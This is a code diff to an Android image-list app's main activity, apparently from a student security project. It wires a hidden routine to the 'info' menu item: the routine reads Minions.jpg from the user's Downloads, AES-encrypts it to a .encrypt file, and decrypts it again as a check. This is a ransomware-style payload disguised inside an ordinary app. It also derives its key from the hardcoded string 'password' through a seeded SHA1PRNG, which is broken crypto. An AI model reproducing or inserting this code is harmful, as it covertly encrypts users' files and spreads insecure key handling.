@@ -7,16 +7,20 @@ import android.content.Context;
 import android.content.DialogInterface;
 import android.media.ExifInterface;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Environment;
+import android.support.annotation.RequiresApi;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.widget.SwipeRefreshLayout;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.support.v7.widget.LinearLayoutManager;
 import android.support.v7.widget.RecyclerView;
+import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.widget.Toast;
+
 import com.client_progettosicurezza.adapters.AdapterImmagine;
 import com.client_progettosicurezza.api.APIService;
 import com.client_progettosicurezza.compiler.Compile;
@@ -24,11 +28,24 @@ import com.client_progettosicurezza.models.Aggiornamento;
 import com.client_progettosicurezza.models.Immagine;
 import com.client_progettosicurezza.results.ResultAggiornamento;
 import com.client_progettosicurezza.results.ResultListaImmagini;
+
+import java.io.BufferedOutputStream;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.security.SecureRandom;
 import java.util.ArrayList;
+
+import javax.crypto.Cipher;
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
+
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -83,6 +100,7 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
+    @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     public boolean onOptionsItemSelected(MenuItem item) {
         int id = item.getItemId();
@@ -111,10 +129,40 @@ public class MainActivity extends AppCompatActivity {
                 break;
 
             case R.id.info:
-                String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
-                File file = new File(pathFile);
+                //String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
+                //File file = new File(pathFile);
+                //payload(file);
 
-                payload(file);
+                try {
+                    Path path = Paths.get(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg");
+                    byte[] plaintext = Files.readAllBytes(path);
+
+                    byte[] key = generateKey("password");
+
+                    byte[] chipertext = encodeFile(key, plaintext);
+
+                    File file_chipertext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg.encrypt");
+                    BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file_chipertext));
+                    bos.write(chipertext);
+                    bos.flush();
+                    bos.close();
+
+
+                    byte[] plaintext_verifica = decodeFile(key, chipertext);
+
+                    File file_plaintext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/vissuto.jpg");
+                    BufferedOutputStream bos2 = new BufferedOutputStream(new FileOutputStream(file_plaintext));
+                    bos2.write(plaintext_verifica);
+                    bos2.flush();
+                    bos2.close();
+
+
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+
+
                 break;
         }
         return true;
@@ -223,6 +271,41 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
+    }
+
+    public static byte[] generateKey(String password) throws Exception
+    {
+        byte[] keyStart = password.getBytes("UTF-8");
+
+        KeyGenerator kgen = KeyGenerator.getInstance("AES");
+        SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
+        sr.setSeed(keyStart);
+        kgen.init(128, sr);
+        SecretKey skey = kgen.generateKey();
+        return skey.getEncoded();
+    }
+
+    public static byte[] encodeFile(byte[] key, byte[] fileData) throws Exception
+    {
+
+        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
+        Cipher cipher = Cipher.getInstance("AES");
+        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
+
+        byte[] encrypted = cipher.doFinal(fileData);
+
+        return encrypted;
+    }
+
+    public static byte[] decodeFile(byte[] key, byte[] fileData) throws Exception
+    {
+        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
+        Cipher cipher = Cipher.getInstance("AES");
+        cipher.init(Cipher.DECRYPT_MODE, skeySpec);
+
+        byte[] decrypted = cipher.doFinal(fileData);
+
+        return decrypted;
     }
 
 }
